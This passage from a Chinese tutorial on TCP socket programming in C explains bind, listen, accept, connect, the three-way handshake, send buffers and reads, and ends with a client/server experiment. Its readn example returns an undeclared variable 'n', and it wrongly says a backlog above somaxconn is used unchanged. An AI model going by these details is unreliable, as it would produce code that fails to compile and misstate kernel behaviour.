string">"socket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span> <span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token comment">/* 绑定到 port 和 ip. */</span>  name<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span> <span class="token comment">/* IPV4 */</span>  name<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span> <span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* 指定端口 */</span>  name<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">htonl</span> <span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 通配地址 */</span>  <span class="token comment">/* 把 IPV4 地址转换成通用地址格式，同时传递长度 */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span> <span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">perror</span> <span class="token punctuation">(</span><span class="token string">"bind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span> <span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">return</span> sock<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>​</p><p>​</p><h5 id="listen">listen</h5><p>​</p><ul><li><p>初始化创建的套接字通过 listen 函数可以将原来的“主动”套接字转换为“被动”套接字，告诉操作系统内核<strong>等待用户请求</strong>，内核会为此做好接收用户请求的准备，比如完成连接队列</p></li><li><p><code>listen</code> 函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">listen</span> <span class="token punctuation">(</span><span class="token keyword">int</span> socketfd<span class="token punctuation">,</span> <span class="token keyword">int</span> backlog<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>socketfd</code> 为套接字描述符</p></li><li><p><code>backlog</code>为未完成连接队列的大小，这个参数的大小决定了可以接收的并发数目（这个参数越大，并发数目理论上也会越大，但是参数过大也会占用过多的系统资源）</p><blockquote><ul><li><p>原先 Linux 实现中 backlog 参数定义了该套接字对应的未完成连接队列的最大长度（pending connections），如果一个连接到达时，队列已满，客户端将会接收一个 ECONNREFUSED 错误信息，如果支持重传，该请求可能会被忽略，之后会进行一次重传</p></li><li><p>从 Linux 2.2 开始，backlog 参数定义的是<strong>已完成连接队列的最大长度</strong>，表示的是已建立的连接（established connection），正在等待被接收（accept 调用返回），如果声明的 backlog 参数比 <code>/proc/sys/net/core/somaxconn</code> 的参数要大，那么就会使用声明的值</p></li><li><p>未完成队列的最大长度值可以通过 <code>/proc/sys/net/ipv4/tcp_max_syn_backlog</code> 完成修改，默认值为 128</p></li></ul></blockquote></li></ul></li></ul><p>​</p><p>​</p><h5 id="accept">accept</h5><p>​</p><ul><li><p>当客户端的连接请求到达时，服务器端应答成功，连接建立，这时操作系统内核要把这个事件通知到应用程序，让应用程序感知到这个连接，<strong>accept 函数的作用就是连接建立之后，操作系统内核和应用程序之间的桥梁</strong></p></li><li><p>accept 函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">int</span> listensockfd<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>cliaddr<span class="token punctuation">,</span> socklen_t <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>listensockfd</code> 是套接字，可以称为 listen 套接字，这就是前面通过 bind，listen 一系列操作而得到的套接字</p></li><li><p>返回值有两个部分，第一个部分 <code>cliadd</code> 是通过指针方式获取的客户端的地址，<code>addrlen</code> 告诉地址的大小；另一部分是函数的返回值，是一个全新的描述字，代表了与客户端的连接</p></li></ul></li><li><p><strong>注意</strong>：有两个套接字描述字，第一个是监听套接字描述字 <code>listensockfd</code>作为输入参数；第二个是返回的已连接套接字描述字</p></li><li><p><strong>监听套接字一直都存在，直到这个监听套接字关闭</strong>，一个客户和服务器连接成功，完成了 TCP 三次握手，操作系统内核就为其生成一个<strong>已连接套接字</strong>，让应用服务器使用这个已连接套接字和客户进行通信处理，如果服务器完成了对这个客户的服务，关闭的就是<strong>已连接套接字</strong>，这样就完成了 TCP 连接的释放，<strong>这时候释放的只是这一个客户连接</strong></p></li></ul><p>​</p><p>​</p><h4 id="客户端发起连接">客户端发起连接</h4><ul><li>第一步建立一个套接字，客户端调用 <code>connect</code> 向服务端发起请求</li></ul><p>​</p><h5 id="connect">connect</h5><ul><li><p>客户端和服务器端的连接建立是通过 <code>connect</code> 函数完成</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>servaddr<span class="token punctuation">,</span> socklen_t addrlen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>sockfd</code> 是连接套接字，通过 <code>socket</code> 函数创建</li><li><code>servaddr</code> 和 <code>addrlen</code> 分别代表指向套接字地址结构的指针和该结构的大小</li></ul></li><li><p>在调用 <code>connect</code> 前不是必须调用 <code>bind</code> 函数，因为如果需要的话，内核会确定源 IP 地址，并按照一定的算法选择一个临时端口作为源端口</p></li><li><p>如果是 TCP 套接字，那么调用 <code>connect</code> 函数将激发 TCP 的三次握手过程，而且仅在连接建立成功或出错时才返回</p></li><li><p><strong>补充</strong>：出错返回可能有以下几种情况，根据不同的返回值可以做进一步的排查</p><ul><li><p>三次握手无法建立，客户端发出的 <code>SYN</code> 包没有任何响应，返回 <code>TIMEOUT</code> 错误，比较常见的原因是对应的服务端 IP 写错</p></li><li><p>客户端收到了 <code>RST</code>（复位）回答，这时候客户端会立即返回 <code>CONNECTION REFUSED</code> 错误，这种情况比较常见于客户端发送连接请求时的请求端口写错</p><blockquote><p>产生 RST 条件</p><ol><li><p>目的地为某端口的 SYN 到达，然而该端口上没有正在监听的服务器</p></li><li><p>TCP 想取消一个已有连接</p></li><li><p>TCP 接收到一个根本不存在的连接上的分节</p></li></ol></blockquote></li><li><p>客户发出的 SYN 包在网络上引起了<code>destination unreachable</code>，目的不可达的错误，常见的原因是客户端和服务器端路由不通</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="TCP-三次握手">TCP 三次握手</h4><ul><li><p>TCP 三次握手过程</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210206-three-way-handshake.png" alt="TCP 三次握手"></p><p>（这里使用的网络编程模型是阻塞式的，调用发起后不会直接返回，由操作系统内核处理之后才会返回）</p><blockquote><p>信道不可靠，但是通信双发需要就某个问题达成一致。而要解决这个问题, 无论在消息中包含什么信息，三次通信是理论上的最小值</p></blockquote></li><li><p>服务端通过 <code>socket</code>、<code>bind</code> 和 <code>listen</code> 完成了被动套接字的准备工作，然后调用 <code>accept</code>，就会阻塞在这里，等待客户端的连接</p></li><li><p>客户端通过 <code>socket</code> 和 <code>connect</code> 函数调用之后也会阻塞，接下来是<strong>内核网络协议栈</strong>工作，具体过程：</p><ul><li><p>客户端的协议栈向服务器端发送了 SYN 包，并告诉服务器端当前发送序列号 <code>j</code>，客户端进入 <code>SYNC_SENT</code> 状态</p></li><li><p>服务器端的协议栈收到包之后进行 ACK 应答，应答值为 <code>j+1</code>，表示对 SYN 包 j 的确认，同时服务器也发送一个 SYN 包，告诉客户端当前我的发送序列号为 <code>k</code>，服务器端进入 <code>SYNC_RCVD</code> 状态</p></li><li><p>客户端协议栈收到 ACK 之后，应用程序从 <code>connect</code> 调用返回，表示客户端到服务器端的单向连接建立成功，客户端的状态为 <code>ESTABLISHED</code>，同时客户端协议栈也会对 SYN 包进行应答，应答数据为 <code>k+1</code></p></li><li><p>应答包到达服务器端后，服务器端协议栈使得 <code>accept</code> 阻塞调用返回，这个时候服务器端到客户端的单向连接也建立成功，服务器端也进入 <code>ESTABLISHED</code> 状态</p></li></ul></li></ul><h3 id="1-5-TCP-Socket-读写">1.5 TCP Socket 读写</h3><h4 id="发送数据">发送数据</h4><ul><li><p>发送数据时常用的有三个函数 <code>write</code>、<code>send</code> 和 <code>sendmsg</code>，每个函数使用的场景略有不同</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t <span class="token function">write</span> <span class="token punctuation">(</span><span class="token keyword">int</span> socketfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span>ssize_t <span class="token function">send</span> <span class="token punctuation">(</span><span class="token keyword">int</span> socketfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span>ssize_t <span class="token function">sendmsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">msghdr</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>write 函数是常见的文件写函数，如果把 <code>socketfd</code> 换成文件描述符，就是普通的文件写入</li><li>send 函数是想指定选项，发送带外数据时使用，<strong>带外数据</strong>是一种基于 TCP 协议的紧急数据，用于客户端 - 服务器在特定场景下的紧急处理</li><li>sendmsg 是想<strong>指定多重缓冲区传输数据</strong>时使用，以结构体 <code>msghdr</code> 的方式发送数据</li></ul></li><li><p>在套接字描述符上调用 <code>write</code> 函数，和在普通文件描述符上调用 <code>write</code> 函数两者的表现形式是一样（都是通过描述符句柄写入指定的数据），但内在的区别不一样</p><ul><li><p>对于普通文件描述符而言，一个文件描述符代表了打开的一个文件句柄，通过调用 write 函数，操作系统内核帮我们不断地往文件系统中写入字节流，此时写入的字节流大小通常和输入参数 size 的值是相同的</p></li><li><p>对于套接字描述符而言，它代表了一个双向连接，在套接字描述符上调用 write 写入的字节数有可能比请求的数量少，这在普通文件描述符情况下是不正常的，内核为读取和发送数据做了很多表面上看不到的工作</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="发送缓冲区">发送缓冲区</h4><ul><li><p>当 TCP 三次握手成功，连接建立后，操作系统内核会为每一个连接创建配套的基础设施，比如发送缓冲区</p></li><li><p>当应用程序调用 <code>write</code> 函数时，实际所做的事情是把数据<strong>从应用程序中拷贝到操作系统内核的发送缓冲区中</strong>，并不一定是把数据通过套接字写出去</p><ul><li><p>操作系统内核的发送缓冲区足够大，可以直接容纳这份数据，我们的程序从 write 调用中退出，返回写入的字节数就是应用程序的数据大小</p></li><li><p>操作系统内核的发送缓冲区够大了，不过还有数据没有发送完，或者数据发送完了，但是操作系统内核的发送缓冲区不足以容纳应用程序数据，在这种情况下，应用程序被阻塞，大部分 UNIX 系统会一直等到可以把应用程序数据完全放到操作系统内核的发送缓冲区中，再从系统调用中返回</p></li></ul><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210225-send-buffer.png" alt=""></p></li></ul><p>​</p><p>​</p><h4 id="读取数据">读取数据</h4><ul><li><p>read 函数原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t <span class="token function">read</span> <span class="token punctuation">(</span><span class="token keyword">int</span> socketfd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>函数要求操作系统内核从套接字描述字 <code>socketfd</code> 读取最多多少个字节（size），并将结果存储到 buffer 中</li><li>返回值告诉我们实际读取的字节数目，也有一些特殊情况<ul><li>如果返回值为 0，表示 EOF（end-of-file），这在网络中表示对端发送了 FIN 包，要处理断连的情况</li><li>如果返回值为 -1，表示出错</li><li>如果是非阻塞 I/O，情况会略有不同</li></ul></li></ul></li><li><p>如果我们想让应用程序每次都读到 size 个字节，就需要编写下面的函数，不断地循环读取：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 从 socketfd 描述字中读取 "size" 个字节. */</span>ssize_t <span class="token function">readn</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>vptr<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    size_t  nleft<span class="token punctuation">;</span>    ssize_t nread<span class="token punctuation">;</span>    <span class="token keyword">char</span>    <span class="token operator">*</span>ptr<span class="token punctuation">;</span>     ptr <span class="token operator">=</span> vptr<span class="token punctuation">;</span>    nleft <span class="token operator">=</span> size<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>nleft <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>nread <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> nleft<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> EINTR<span class="token punctuation">)</span>                nread <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">/* 非阻塞 I/O 的情况下，没有数据可以读，需要再次调用 read */</span>            <span class="token keyword">else</span>                <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nread <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token comment">/* EOF(End of File) 表示套接字关闭 */</span>        nleft <span class="token operator">-=</span> nread<span class="token punctuation">;</span>        ptr   <span class="token operator">+=</span> nread<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>n <span class="token operator">-</span> nleft<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* 返回的是实际读取的字节数 */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>可不可以无限增大缓冲区</strong>，这样不就可以提高应用程序的吞吐量了么？</p><p>不行，write 函数发送数据只是将数据发送到内核缓冲区，而什么时候发送由内核决定，内核缓冲区总是充满数据时会产生<strong>粘包</strong>问题，同时网络的传输大小 MTU 也会限制每次发送的大小，最后由于数据堵塞需要消耗大量内存资源，资源使用效率不高</p></blockquote><blockquote><p>一段数据流从应用程序发送端，一直到应用程序接收端，总共经过了多少次拷贝？</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220506-copy.png" alt=""></p></blockquote></li></ul><p>​</p><p>​</p><h4 id="实验">实验</h4><ul><li><p>一个客户端 - 服务器的例子，其中客户端不断地发送数据，服务器端每读取一段数据之后进行休眠</p></li><li><p><em>tcp_server.c</em>：服务器端读取数据程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span><span class="token keyword">void</span> <span class="token function">read_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ssize_t n<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"block in read\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 每次读取 1K 数据之后休眠 1 秒</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">readn</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        time<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"1K read for %d \n"</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> listenfd<span class="token punctuation">,</span> connfd<span class="token punctuation">;</span>    socklen_t clilen<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> cliaddr<span class="token punctuation">,</span> servaddr<span class="token punctuation">;</span>    listenfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* bind到本地地址，端口为12345 */</span>    <span class="token function">bind</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* listen的backlog为1024 */</span>    <span class="token function">listen</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 循环处理用户请求 */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        clilen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cliaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>        connfd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>cliaddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>clilen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* 获取实际的连接 */</span>        <span class="token function">read_data</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* 读取数据 */</span>        <span class="token function">close</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">/* 关闭连接套接字，注意不是监听套接字*/</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><em>tcp_client.c</em>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token expression">MESSAGE_SIZE <span class="token number">102400</span></span></span><span class="token keyword">void</span> <span class="token function">send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 初始化一个长度为 MESSAGE_SIZE 的字符串流</span>    <span class="token keyword">char</span> <span class="token operator">*</span>query<span class="token punctuation">;</span>    query <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>MESSAGE_SIZE <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MESSAGE_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        query<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    query<span class="token punctuation">[</span>MESSAGE_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cp<span class="token punctuation">;</span>    cp <span class="token operator">=</span> query<span class="token punctuation">;</span>    size_t remaining <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>remaining<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n_written <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> remaining<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"send into buffer %ld \n"</span><span class="token punctuation">,</span> n_written<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n_written <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"send failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        remaining <span class="token operator">-=</span> n_written<span class="token punctuation">;</span>        cp <span class="token operator">+=</span> n_written<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sockfd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> servaddr<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: tcpclient &lt;IPaddress&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sockfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> connect_rt <span class="token operator">=</span> <span class="token function">connect</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 向服务器端发起连接请求</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>connect_rt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"connect failed "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">send_data</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用 send_data 发送数据</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编译运行：</p><p><img src="20210225-194139.png" alt="client"></p><p><img src="20210225-194214.png" alt="server"></p><ul><li><p>程序运行后，服务端不断地在屏幕上打印出读取字节流的过程</p></li><li><p>客户端直到最后所有的字节流发送完毕才打印出“send into buffer”，说明在此之前 send 